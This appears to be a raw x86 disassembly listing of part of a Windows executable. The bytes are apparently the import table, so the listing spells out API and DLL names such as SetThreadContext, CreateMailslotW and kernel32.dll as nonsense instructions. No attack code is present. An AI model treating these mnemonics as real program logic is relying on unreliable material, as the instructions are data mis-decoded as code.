  41320c:	add    BYTE PTR [eax],al
  41320e:	add    BYTE PTR [ecx],0x46
  413211:	jb     0x413278
  413213:	gs dec esp
  413215:	imul   esp,DWORD PTR [edx+0x72],0x797261
  41321c:	rol    BYTE PTR [ecx],1
  41321e:	inc    edi
  41321f:	gs je  0x413266
  413222:	popa   
  413223:	je     0x41328a
  413225:	inc    esi
  413226:	outs   dx,DWORD PTR ds:[esi]
  413227:	jb     0x413296
  413229:	popa   
  41322a:	je     0x41326d
  41322c:	add    BYTE PTR [eax],al
  41322e:	outs   dx,DWORD PTR ds:[esi]
  41322f:	add    al,BYTE PTR [edi+0x65]
  413232:	je     0x413288
  413234:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41323b:	popa   
  41323c:	je     0x41327f
  41323e:	add    BYTE PTR [eax],al
  413240:	jge    0x413246
  413242:	push   esi
  413243:	gs jb  0x4132af
  413246:	data16 jns 0x41329f
  413249:	gs jb  0x4132bf
  41324c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  413253:	push   edi
  413254:	add    BYTE PTR [eax],al
  413256:	xchg   edi,eax
  413257:	add    al,BYTE PTR [edi+0x6c]
  41325a:	outs   dx,DWORD PTR ds:[esi]
  41325b:	bound  esp,QWORD PTR [ecx+0x6c]
  41325e:	push   edx
  41325f:	gs inc ecx
  413261:	ins    BYTE PTR es:[edi],dx
  413262:	ins    BYTE PTR es:[edi],dx
  413263:	outs   dx,DWORD PTR ds:[esi]
  413264:	arpl   WORD PTR [eax],ax
  413266:	fild   DWORD PTR [eax]
  413268:	inc    ebx
  413269:	jb     0x4132d0
  41326b:	popa   
  41326c:	je     0x4132d3
  41326e:	dec    ebp
  41326f:	popa   
  413270:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  413278:	in     al,0x3
  41327a:	push   ebx
  41327b:	gs je  0x4132c1
  41327e:	outs   dx,DWORD PTR ds:[esi]
  41327f:	ins    DWORD PTR es:[edi],dx
  413280:	ins    DWORD PTR es:[edi],dx
  413281:	push   esp
  413282:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  413289:	add    BYTE PTR [edx+eax*1+0x47],dl
  41328d:	gs je  0x4132e3
  413290:	jns    0x413305
  413292:	je     0x4132f9
  413294:	ins    DWORD PTR es:[edi],dx
  413295:	push   esp
  413296:	imul   ebp,DWORD PTR [ebp+0x65],0x47025000
  41329d:	gs je  0x4132f3
  4132a0:	jns    0x413315
  4132a2:	je     0x413309
  4132a4:	ins    DWORD PTR es:[edi],dx
  4132a5:	inc    esp
  4132a6:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4132ad:	jns    0x413306
  4132af:	add    bl,cl
  4132b1:	add    cl,BYTE PTR [ecx+0x73]
  4132b4:	inc    edx
  4132b5:	popa   
  4132b6:	fs push edx
  4132b8:	gs popa 
  4132ba:	fs push eax
  4132bc:	je     0x413330
  4132be:	add    BYTE PTR [eax],al
  4132c0:	mov    eax,ds:0x61654802
  4132c5:	jo     0x413308
  4132c7:	ins    BYTE PTR es:[edi],dx
  4132c8:	ins    BYTE PTR es:[edi],dx
  4132c9:	outs   dx,DWORD PTR ds:[esi]
  4132ca:	arpl   WORD PTR [eax],ax
  4132cc:	and    al,BYTE PTR [ecx]
  4132ce:	inc    ebp
  4132cf:	outs   dx,BYTE PTR ds:[esi]
  4132d0:	jne    0x41333f
  4132d2:	push   edx
  4132d3:	gs jae 0x413345
  4132d6:	jne    0x41334a
  4132d8:	arpl   WORD PTR [ebp+0x54],sp
  4132db:	jns    0x41334d
  4132dd:	gs jae 0x413321
  4132e0:	add    BYTE PTR [eax],al
  4132e2:	push   es
  4132e3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4132e7:	fs dec esp
  4132e9:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  4132f0:	js     0x413333
  4132f2:	add    BYTE PTR [eax],al
  4132f4:	mov    bl,0x0
  4132f6:	inc    ebx
  4132f7:	outs   dx,DWORD PTR ds:[esi]
  4132f8:	ins    DWORD PTR es:[edi],dx
  4132f9:	jo     0x41335c
  4132fb:	jb     0x413362
  4132fd:	push   ebx
  4132fe:	je     0x413372
  413300:	imul   ebp,DWORD PTR [esi+0x67],0x12000041
  413307:	add    al,0x53
  413309:	gs je  0x413351
  41330c:	jb     0x413380
  41330e:	outs   dx,DWORD PTR ds:[esi]
  41330f:	jb     0x41335e
  413311:	outs   dx,DWORD PTR ds:[esi]
  413312:	fs add BYTE PTR gs:[eax],al
  413316:	out    0x0,al
  413318:	inc    ebx
  413319:	jb     0x413380
  41331b:	popa   
  41331c:	je     0x413383
  41331e:	push   edx
  41331f:	gs ins DWORD PTR es:[edi],dx
  413321:	outs   dx,DWORD PTR ds:[esi]
  413322:	je     0x413389
  413324:	push   esp
  413325:	push   0x64616572
  41332a:	add    BYTE PTR [eax],al
  41332c:	pop    DWORD PTR [edx]
  41332e:	inc    edi
  41332f:	ins    BYTE PTR es:[edi],dx
  413330:	outs   dx,DWORD PTR ds:[esi]
  413331:	bound  esp,QWORD PTR [ecx+0x6c]
  413334:	inc    esi
  413335:	ins    BYTE PTR es:[edi],dx
  413336:	popa   
  413337:	addr16 jae 0x41333a
  41333a:	mov    es,WORD PTR [edi+edx*2]
  41333d:	popa   
  41333e:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  413346:	ins    BYTE PTR es:[di],dx
  413348:	gs dec edi
  41334a:	bound  ebp,QWORD PTR [edx+0x65]
  41334d:	arpl   WORD PTR [eax+eax*1+0x18],si
  413351:	add    al,BYTE PTR [edi+0x65]
  413354:	je     0x4133a4
  413356:	jne    0x4133c5
  413358:	bound  esp,QWORD PTR [ebp+0x72]
  41335b:	inc    esi
  41335c:	outs   dx,DWORD PTR ds:[esi]
  41335d:	jb     0x4133cc
  41335f:	popa   
  413360:	je     0x4133b9
  413362:	add    BYTE PTR [eax],al
  413364:	xchg   ebx,eax
  413365:	add    al,0x57
  413367:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x54726168
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	dec    ebp
  413371:	jne    0x4133df
  413373:	je     0x4133de
  413375:	inc    edx
  413376:	jns    0x4133ec
  413378:	add    BYTE PTR gs:[ebp+0x2],cl
  41337c:	inc    edi
  41337d:	gs je  0x4133d3
  413380:	jns    0x4133f5
  413382:	je     0x4133e9
  413384:	ins    DWORD PTR es:[edi],dx
  413385:	inc    esp
  413386:	gs popaw 
  413389:	jne    0x4133f7
  41338b:	je     0x4133e2
  41338d:	dec    ecx
  41338e:	dec    esp
  41338f:	popa   
  413390:	outs   dx,BYTE PTR ds:[esi]
  413391:	addr16 jne 0x4133f5
  413394:	add    BYTE PTR gs:[bx+si],al
  413398:	test   DWORD PTR [edx],eax
  41339a:	inc    edi
  41339b:	gs je  0x4133f5
  41339e:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  4133a5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4133ac:	jns    0x413405
  4133ae:	add    BYTE PTR [eax],al
  4133b0:	jl     0x4133b2
  4133b2:	inc    ecx
  4133b3:	fs fs inc ecx
  4133b6:	je     0x413427
  4133b8:	ins    DWORD PTR es:[edi],dx
  4133b9:	inc    ecx
  4133ba:	add    BYTE PTR [eax],al
  4133bc:	stos   BYTE PTR es:[edi],al
  4133bd:	add    BYTE PTR [ebx+0x6c],al
  4133c0:	gs popa 
  4133c2:	jb     0x413407
  4133c4:	outs   dx,DWORD PTR ds:[esi]
  4133c5:	ins    DWORD PTR es:[edi],dx
  4133c6:	ins    DWORD PTR es:[edi],dx
  4133c7:	inc    ebp
  4133c8:	jb     0x41343c
  4133ca:	outs   dx,DWORD PTR ds:[esi]
  4133cb:	jb     0x4133cd
  4133cd:	add    ch,al
  4133cf:	add    al,0x6c
  4133d1:	jae    0x413447
  4133d3:	jb     0x413438
  4133d5:	ins    DWORD PTR es:[edi],dx
  4133d6:	jo     0x413441
  4133d8:	inc    ecx
  4133d9:	add    BYTE PTR [esi],dh
  4133db:	add    al,0x53
  4133dd:	gs je  0x413434
  4133e0:	push   0x64616572
  4133e5:	inc    ebx
  4133e6:	outs   dx,DWORD PTR ds:[esi]
  4133e7:	outs   dx,BYTE PTR ds:[esi]
  4133e8:	je     0x41344f
  4133ea:	js     0x413460
  4133ec:	add    BYTE PTR [eax],al
  4133ee:	repnz add BYTE PTR [ebx+0x72],al
  4133f2:	gs popa 
  4133f4:	je     0x41345b
  4133f6:	push   edi
  4133f7:	popa   
  4133f8:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  413400:	ins    DWORD PTR es:[edi],dx
  413401:	gs jb  0x413445
  413404:	add    BYTE PTR [eax],al
  413406:	mov    BYTE PTR [esp+ebp*2],0x73
  41340a:	je     0x41347e
  41340c:	arpl   WORD PTR [ebp+0x70],bp
  41340f:	imul   edx,DWORD PTR [edi+0x0],0x724300d3
  413416:	gs popa 
  413418:	je     0x41347f
  41341a:	inc    esi
  41341b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53044c00
  413423:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  41342a:	jae    0x41349b
  41342c:	jne    0x4134a0
  41342e:	arpl   WORD PTR [ebp+0x0],sp
  413431:	add    BYTE PTR [eax],cl
  413433:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  413437:	fs dec esp
  413439:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  413440:	add    BYTE PTR [eax],al
  413442:	mov    al,BYTE PTR [ecx]
  413444:	inc    edi
  413445:	gs je  0x413489
  413448:	inc    ebx
  413449:	push   eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	pop    ss
  41344d:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  413451:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413455:	add    BYTE PTR gs:[eax],al
  413458:	dec    ebx
  413459:	inc    ebp
  41345a:	push   edx
  41345b:	dec    esi
  41345c:	inc    ebp
  41345d:	dec    esp
  41345e:	xor    esi,DWORD PTR [edx]
  413460:	cs fs ins BYTE PTR es:[edi],dx
  413463:	ins    BYTE PTR es:[edi],dx
  413464:	add    BYTE PTR [eax],al
  413466:	add    al,0x0
  413468:	inc    ebx
  413469:	push   0x65736f6f
  41346e:	inc    esi
  41346f:	outs   dx,DWORD PTR ds:[esi]
  413470:	outs   dx,BYTE PTR ds:[esi]
  413471:	je     0x4134ca
  413473:	add    BYTE PTR [edi],dl
  413475:	add    BYTE PTR [eax+0x72],dl
  413478:	imul   ebp,DWORD PTR [esi+0x74],0x57676c44
  41347f:	add    BYTE PTR [esi],cl
  413481:	add    BYTE PTR [edi+0x65],al
  413484:	je     0x4134d5
  413486:	jo     0x4134ed
  413488:	outs   dx,BYTE PTR ds:[esi]
  413489:	inc    esi
  41348a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  413492:	add    BYTE PTR [eax],al
  413494:	or     al,BYTE PTR [eax]
  413496:	inc    esi
  413497:	imul   ebp,DWORD PTR [esi+0x64],0x74786554
  41349e:	push   edi
  41349f:	add    BYTE PTR [ebx+0x6f],ah
  4134a2:	ins    DWORD PTR es:[edi],dx
  4134a3:	fs ins BYTE PTR es:[edi],dx
  4134a5:	xor    esi,DWORD PTR [bp+si]
  4134a8:	cs fs ins BYTE PTR es:[edi],dx
  4134ab:	ins    BYTE PTR es:[edi],dx
  4134ac:	add    BYTE PTR [eax],al
  4134ae:	cmc    
  4134af:	add    BYTE PTR [edi+0x63],bl
  4134b2:	outs   dx,DWORD PTR ds:[esi]
  4134b3:	outs   dx,BYTE PTR ds:[esi]
  4134b4:	je     0x413528
  4134b6:	outs   dx,DWORD PTR ds:[esi]
  4134b7:	ins    BYTE PTR es:[edi],dx
  4134b8:	data16 jo 0x4134bb
  4134bb:	add    BYTE PTR [ebx+0x735f5f00],dh
  4134c1:	gs je  0x413523
  4134c4:	popa   
  4134c5:	jo     0x413537
  4134c7:	pop    edi
  4134c8:	je     0x413543
  4134ca:	jo     0x413531
  4134cc:	add    BYTE PTR [eax],al
  4134ce:	mov    al,ds:0x705f5f00
  4134d3:	pop    edi
  4134d4:	pop    edi
  4134d5:	ins    WORD PTR es:[edi],dx
  4134d7:	outs   dx,DWORD PTR ds:[esi]
  4134d8:	fs add BYTE PTR gs:[eax],al
  4134dc:	ins    DWORD PTR es:[edi],dx
  4134dd:	add    esp,DWORD PTR [esi+0x67]
  4134e0:	gs je  0x413546
  4134e3:	add    BYTE PTR [ebx+0x705f5f00],bl
  4134e9:	pop    edi
  4134ea:	pop    edi
  4134eb:	arpl   WORD PTR [edi+0x6d],bp
  4134ee:	ins    DWORD PTR es:[edi],dx
  4134ef:	outs   dx,DWORD PTR ds:[esi]
  4134f0:	fs add BYTE PTR gs:[eax],al
  4134f4:	mov    bh,0x3
  4134f6:	ins    DWORD PTR es:[edi],dx
  4134f7:	bound  esi,QWORD PTR [ebx+0x74]
  4134fa:	outs   dx,DWORD PTR ds:[esi]
  4134fb:	ja     0x413560
  4134fd:	jae    0x4134ff
  4134ff:	add    bl,bl
  413501:	add    BYTE PTR [edi+0x61],bl
  413504:	ins    DWORD PTR es:[edi],dx
  413505:	jae    0x41356e
  413507:	pop    edi
  413508:	gs js  0x413574
  41350b:	je     0x41350d
  41350d:	add    BYTE PTR [ebx+0x65736603],al
  413513:	imul   eax,DWORD PTR gs:[eax],0xffffff86
  413517:	add    DWORD PTR [edi+0x69],ebx
  41351a:	outs   dx,BYTE PTR ds:[esi]
  41351b:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x33006d72
  413523:	add    al,0x77
  413525:	arpl   WORD PTR [ebx+0x74],si
  413528:	outs   dx,DWORD PTR ds:[esi]
  413529:	imul   eax,DWORD PTR [eax],0x0
  41352c:	xchg   esp,eax
  41352d:	add    ebp,DWORD PTR [ecx+0x73]
  413530:	popa   
  413531:	ins    BYTE PTR es:[edi],dx
  413532:	outs   dx,BYTE PTR ds:[esi]
  413533:	jne    0x4135a2
  413535:	add    BYTE PTR [esi],al
  413537:	add    al,0x74
  413539:	imul   ebp,DWORD PTR [ebp+0x65],0x41c0000
  413540:	ja     0x4135a5
  413542:	jae    0x4135a7
  413544:	popa   
  413545:	je     0x413547
  413547:	add    al,ch
  413549:	add    esi,DWORD PTR [ebx+0x74]
  41354c:	jb     0x4135b1
  41354e:	jo     0x4135c9
  413550:	add    BYTE PTR [eax],al
  413552:	out    0x3,eax
  413554:	jae    0x4135ca
  413556:	jb     0x4135bb
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	ins    BYTE PTR es:[edi],dx
  41355a:	ins    BYTE PTR es:[edi],dx
  41355b:	add    BYTE PTR [esi],dh
  41355d:	add    al,0x77
  41355f:	arpl   WORD PTR [ebx+0x74],si
  413562:	outs   dx,DWORD PTR ds:[esi]
  413563:	ins    DWORD PTR es:[edi],dx
  413564:	bound  esi,QWORD PTR [ebx+0x0]
  413567:	add    BYTE PTR [edi+0x3],bl
  41356a:	arpl   WORD PTR [ebp+eiz*2+0x61],bp
  41356e:	jb     0x4135d5
  413570:	jb     0x4135e4
  413572:	add    BYTE PTR [eax],al
  413574:	jmp    0x7363:0x72747303
  41357b:	jo     0x4135eb
  41357d:	add    ch,ah
  41357f:	add    esi,DWORD PTR [ebx+0x74]
  413582:	jb     0x4135e7
  413584:	push   0x1000072
  413589:	add    al,0x73
  41358b:	ja     0x413600
  41358d:	arpl   WORD PTR [ecx+0x6e],sp
  413590:	data16 add BYTE PTR [esi+0x73695f01],bl
  413597:	ins    DWORD PTR es:[edi],dx
  413598:	bound  esp,QWORD PTR [edx+0x6c]
  41359b:	gs popa 
  41359d:	add    BYTE PTR fs:[eax],al
  4135a0:	int3   
  4135a1:	add    esi,DWORD PTR [ecx+0x73]
  4135a4:	outs   dx,DWORD PTR ds:[esi]
  4135a5:	jb     0x41361b
  4135a7:	add    BYTE PTR [ebx],cl
  4135a9:	add    al,0x74
  4135ab:	outs   dx,DWORD PTR ds:[esi]
  4135ac:	ja     0x41361a
  4135ae:	outs   dx,DWORD PTR ds:[esi]
  4135af:	ja     0x413616
  4135b1:	jb     0x4135b3
  4135b3:	add    BYTE PTR [ebp+0x6c616d03],dh
  4135b9:	ins    BYTE PTR es:[edi],dx
  4135ba:	outs   dx,DWORD PTR ds:[esi]
  4135bb:	arpl   WORD PTR [eax],ax
  4135bd:	add    BYTE PTR [ebx],al
  4135bf:	add    al,0x73
  4135c1:	jns    0x413636
  4135c3:	je     0x41362a
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	add    BYTE PTR [eax],al
  4135c8:	sub    al,0x4
  4135ca:	ja     0x41362f
  4135cc:	jae    0x41363e
  4135ce:	bound  esi,QWORD PTR [edx+0x6b]
  4135d1:	add    BYTE PTR [eax],bl
  4135d3:	add    al,0x76
  4135d5:	jae    0x41364e
  4135d7:	jo     0x41364b
  4135d9:	imul   ebp,DWORD PTR [esi+0x74],0x520066
  4135e0:	pop    edi
  4135e1:	pop    eax
  4135e2:	arpl   WORD PTR [eax+0x74],si
  4135e5:	inc    esi
  4135e6:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4160072
  4135ee:	jbe    0x413663
  4135f0:	jo     0x413664
  4135f2:	imul   ebp,DWORD PTR [esi+0x74],0x78000066
  4135f9:	add    esp,DWORD PTR [esi+0x70]
  4135fc:	jne    0x413672
  4135fe:	arpl   WORD PTR [eax],ax
  413600:	mov    cl,0x3
  413602:	ins    BYTE PTR es:[edi],dx
  413603:	outs   dx,DWORD PTR ds:[esi]
  413604:	arpl   WORD PTR [ecx+0x6c],sp
  413607:	je     0x413672
  413609:	ins    DWORD PTR es:[edi],dx
  41360a:	add    BYTE PTR gs:[ebx+eax*1+0x66],ch
  41360f:	data16 ins BYTE PTR es:[edi],dx
  413611:	jne    0x413686
  413613:	push   0x41e0000
  413618:	ja     0x41367d
  41361a:	jae    0x41367f
  41361c:	push   0x23000072
  413621:	add    DWORD PTR [edi+0x65],ebx
  413624:	js     0x41368f
  413626:	je     0x413628
  413628:	pop    ebp
  413629:	add    esp,DWORD PTR [ebx+0x61]
  41362c:	ins    BYTE PTR es:[edi],dx
  41362d:	ins    BYTE PTR es:[edi],dx
  41362e:	outs   dx,DWORD PTR ds:[esi]
  41362f:	arpl   WORD PTR [eax],ax
  413631:	add    cl,bl
  413633:	add    esi,DWORD PTR [ebx+0x65]
  413636:	je     0x4136ae
  413638:	bound  esi,QWORD PTR [ebp+0x66]
  41363b:	add    BYTE PTR [ebx+0x70736903],bl
  413641:	jb     0x4136ac
  413643:	outs   dx,BYTE PTR ds:[esi]
  413644:	je     0x413646
  413646:	or     eax,0x676e7504
  41364b:	gs je  0x4136b1
  41364e:	add    BYTE PTR [eax],al
  413650:	cmp    BYTE PTR [edi+esi*2],al
  413653:	arpl   WORD PTR [ebx+0x74],si
  413656:	outs   dx,DWORD PTR ds:[esi]
  413657:	jne    0x4136c5
  413659:	add    al,ch
  41365b:	add    BYTE PTR [edi+0x63],bl
  41365e:	gs js  0x4136ca
  413661:	je     0x413663
  413663:	add    BYTE PTR [ebx+0x3],bl
  413666:	bound  esi,QWORD PTR [ebx+0x65]
  413669:	popa   
  41366a:	jb     0x4136cf
  41366c:	push   0x5f00b500
  413671:	pop    edi
  413672:	jae    0x4136d9
  413674:	je     0x4136eb
  413676:	jae    0x4136dd
  413678:	jb     0x4136e7
  41367a:	popa   
  41367b:	je     0x4136e5
  41367d:	gs jb  0x4136f2
  413680:	add    BYTE PTR [eax],al
  413682:	jb     0x413684
  413684:	pop    edi
  413685:	pop    edi
  413686:	addr16 gs je 0x4136f7
  41368a:	popa   
  41368b:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413692:	enter  0x7003,0x75
  413696:	je     0x4136fb
  413698:	push   0x4d007261
  41369d:	push   ebx
  41369e:	push   esi
  41369f:	inc    ebx
  4136a0:	push   edx
  4136a1:	push   esp
  4136a2:	cs fs ins BYTE PTR es:[edi],dx
  4136a5:	ins    BYTE PTR es:[edi],dx
  4136a6:	add    BYTE PTR [eax],al
  4136a8:	push   edi
  4136a9:	add    BYTE PTR [ecx+0x6e],cl
  4136ac:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  4136b4:	inc    ebx
  4136b5:	outs   dx,DWORD PTR ds:[esi]
  4136b6:	outs   dx,BYTE PTR ds:[esi]
  4136b7:	je     0x41372b
  4136b9:	outs   dx,DWORD PTR ds:[esi]
  4136ba:	ins    BYTE PTR es:[edi],dx
  4136bb:	jae    0x413702
  4136bd:	js     0x4136bf
  4136bf:	add    BYTE PTR [ebp+0x0],al
  4136c2:	dec    ecx
  4136c3:	ins    DWORD PTR es:[edi],dx
  4136c4:	popa   
  4136c5:	addr16 gs dec esp
  4136c8:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4136cf:	fs dec ecx
  4136d1:	ins    DWORD PTR es:[edi],dx
  4136d2:	popa   
  4136d3:	addr16 gs push edi
  4136d6:	add    BYTE PTR [eax],al
  4136d8:	adc    eax,DWORD PTR [eax]
  4136da:	inc    ebx
  4136db:	jb     0x413742
  4136dd:	popa   
  4136de:	je     0x413745
  4136e0:	push   eax
  4136e1:	jb     0x413752
  4136e3:	jo     0x41374a
  4136e5:	jb     0x41375b
  4136e7:	jns    0x41373c
  4136e9:	push   0x50746565
  4136ee:	popa   
  4136ef:	addr16 gs push edi
  4136f2:	add    BYTE PTR [eax],al
  4136f4:	dec    esi
  4136f5:	add    BYTE PTR [ecx+0x6d],cl
  4136f8:	popa   
  4136f9:	addr16 gs dec esp
  4136fc:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413703:	ins    BYTE PTR es:[edi],dx
  413704:	popa   
  413705:	arpl   WORD PTR [ebp+0x49],sp
  413708:	arpl   WORD PTR [edi+0x6e],bp
  41370b:	add    BYTE PTR [edi],bh
  41370d:	add    BYTE PTR [ecx+0x6d],cl
  413710:	popa   
  413711:	addr16 gs dec esp
  413714:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  41371b:	dec    ecx
  41371c:	arpl   WORD PTR [edi+0x6e],bp
  41371f:	push   ebx
  413720:	imul   edi,DWORD PTR [edx+0x65],0x49003e00
  413727:	ins    DWORD PTR es:[edi],dx
  413728:	popa   
  413729:	addr16 gs dec esp
  41372c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  413733:	dec    ecx
  413734:	arpl   WORD PTR [edi+0x6e],bp
  413737:	add    BYTE PTR [ebx+0x4f],al
  41373a:	dec    ebp
  41373b:	inc    ebx
  41373c:	push   esp
  41373d:	dec    esp
  41373e:	xor    esi,DWORD PTR [edx]
  413740:	cs fs ins BYTE PTR es:[edi],dx
  413743:	ins    BYTE PTR es:[edi],dx
  413744:	add    BYTE PTR [eax],al
  413746:	les    eax,FWORD PTR [eax]
  413748:	inc    ebp
  413749:	outs   dx,BYTE PTR ds:[esi]
  41374a:	jne    0x4137b9
  41374c:	inc    esi
  41374d:	outs   dx,DWORD PTR ds:[esi]
  41374e:	outs   dx,BYTE PTR ds:[esi]
  41374f:	je     0x413797
  413751:	popa   
  413752:	ins    DWORD PTR es:[edi],dx
  413753:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41375b:	add    ah,bl
  41375d:	add    DWORD PTR [ebx+0x65],edx
  413760:	je     0x4137a6
  413762:	dec    ecx
  413763:	inc    edx
  413764:	inc    ebx
  413765:	outs   dx,DWORD PTR ds:[esi]
  413766:	ins    BYTE PTR es:[edi],dx
  413767:	outs   dx,DWORD PTR ds:[esi]
  413768:	jb     0x4137be
  41376a:	popa   
  41376b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41376f:	add    ch,dl
  413771:	add    BYTE PTR [ebp+0x78],al
  413774:	je     0x4137ca
  413776:	gs js  0x4137ed
  413779:	dec    edi
  41377a:	jne    0x4137f0
  41377c:	push   edi
  41377d:	add    BYTE PTR [edx+0x65724300],ah
  413783:	popa   
  413784:	je     0x4137eb
  413786:	dec    ecx
  413787:	inc    ebx
  413788:	push   edi
  413789:	add    BYTE PTR [ecx+0x6d6f4300],al
  41378f:	bound  ebp,QWORD PTR [ecx+0x6e]
  413792:	gs push edx
  413794:	outs   dx,BYTE PTR ds:[si]
  413796:	add    BYTE PTR [eax],al
  413798:	mov    bl,0x0
  41379a:	inc    esp
  41379b:	gs ins BYTE PTR es:[edi],dx
  41379d:	gs je  0x413805
  4137a0:	inc    esp
  4137a1:	inc    ebx
  4137a2:	add    BYTE PTR [eax],al
  4137a4:	inc    ecx
  4137a5:	add    DWORD PTR [edi+0x65],eax
  4137a8:	je     0x4137ee
  4137aa:	gs jbe 0x413816
  4137ad:	arpl   WORD PTR [ebp+0x43],sp
  4137b0:	popa   
  4137b1:	jo     0x413826
  4137b3:	add    BYTE PTR [ecx],ah
  4137b5:	add    DWORD PTR [edi+0x65],eax
  4137b8:	je     0x4137fc
  4137ba:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4137c2:	jae    0x4137c4
  4137c4:	mov    DWORD PTR [ecx],0x65766153
  4137ca:	inc    esp
  4137cb:	inc    ebx
  4137cc:	add    BYTE PTR [eax],al
  4137ce:	jne    0x4137d0
  4137d0:	inc    edx
  4137d1:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4137da:	add    DWORD PTR [ecx],0x47
  4137dd:	gs je  0x413834
  4137e0:	gs js  0x413857
  4137e3:	inc    ebp
  4137e4:	js     0x41385a
  4137e6:	outs   dx,BYTE PTR gs:[esi]
  4137e8:	je     0x41383a
  4137ea:	outs   dx,DWORD PTR ds:[esi]
  4137eb:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4137f2:	stos   BYTE PTR es:[edi],al
  4137f3:	add    BYTE PTR [ebx+0x72],al
  4137f6:	gs popa 
  4137f8:	je     0x41385f
  4137fa:	push   eax
  4137fb:	outs   dx,DWORD PTR ds:[esi]
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	jns    0x413866
  4137ff:	outs   dx,DWORD PTR ds:[esi]
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	push   edx
  413802:	outs   dx,BYTE PTR ds:[si]
  413804:	add    BYTE PTR [eax],al
  413806:	xchg   ebx,eax
  413807:	add    BYTE PTR [ebx+0x72],al
  41380a:	gs popa 
  41380c:	je     0x413873
  41380e:	inc    esp
  41380f:	dec    ecx
  413810:	inc    edx
  413811:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb6000070
  413819:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  41381d:	gs je  0x413885
  413820:	dec    edi
  413821:	bound  ebp,QWORD PTR [edx+0x65]
  413824:	arpl   WORD PTR [eax+eax*1+0x0],si
  413828:	outs   dx,BYTE PTR ds:[esi]
  413829:	add    DWORD PTR [edi+0x65],eax
  41382c:	je     0x41387e
  41382e:	imul   edi,DWORD PTR [eax+0x65],0x8900006c
  413835:	add    BYTE PTR [ebx+0x72],al
  413838:	gs popa 
  41383a:	je     0x4138a1
  41383c:	inc    edx
  41383d:	jb     0x4138b4
  41383f:	jae    0x4138a9
  413841:	dec    ecx
  413842:	outs   dx,BYTE PTR ds:[esi]
  413843:	imul   esi,DWORD PTR fs:[edx+0x65],0x8a007463
  41384b:	add    DWORD PTR [edi+0x65],eax
  41384e:	je     0x4138a4
  413850:	gs js  0x4138c7
  413853:	dec    ebp
  413854:	gs je  0x4138c9
  413857:	imul   esp,DWORD PTR [ebx+0x73],0x870041
  41385e:	inc    ebx
  41385f:	jb     0x4138c6
  413861:	popa   
  413862:	je     0x4138c9
  413864:	inc    edx
  413865:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd3000070
  41386d:	add    DWORD PTR [ebx+0x65],edx
  413870:	je     0x4138b4
  413872:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  41387a:	outs   dx,BYTE PTR gs:[esi]
  41387c:	jae    0x4138e7
  41387e:	outs   dx,DWORD PTR ds:[esi]
  41387f:	outs   dx,BYTE PTR ds:[esi]
  413880:	inc    ebp
  413881:	js     0x413883
  413883:	add    BYTE PTR [edx+0x65724300],bl
  413889:	popa   
  41388a:	je     0x4138f1
  41388c:	inc    esi
  41388d:	outs   dx,DWORD PTR ds:[esi]
  41388e:	outs   dx,BYTE PTR ds:[esi]
  41388f:	je     0x4138da
  413891:	outs   dx,BYTE PTR ds:[esi]
  413892:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41389a:	iret   
  41389b:	add    DWORD PTR [ebx+0x65],edx
  41389e:	ins    BYTE PTR es:[edi],dx
  41389f:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4138a4:	ins    BYTE PTR es:[edi],dx
  4138a5:	gs je  0x41391c
  4138a8:	gs add dh,al
  4138ab:	add    DWORD PTR [edx+0x6f],edx
  4138ae:	jne    0x41391e
  4138b0:	fs push edx
  4138b2:	arpl   WORD PTR gs:[eax+eax*1-0x50],si
  4138b7:	add    BYTE PTR [ebx+0x72],al
  4138ba:	gs popa 
  4138bc:	je     0x413923
  4138be:	push   ebx
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	ins    BYTE PTR es:[edi],dx
  4138c1:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  4138c9:	add    BYTE PTR [edx],bh
  4138cb:	add    DWORD PTR [edi+0x65],eax
  4138ce:	je     0x413913
  4138d0:	jne    0x413944
  4138d2:	jb     0x413939
  4138d4:	outs   dx,BYTE PTR ds:[esi]
  4138d5:	je     0x413926
  4138d7:	bound  ebp,QWORD PTR [edx+0x65]
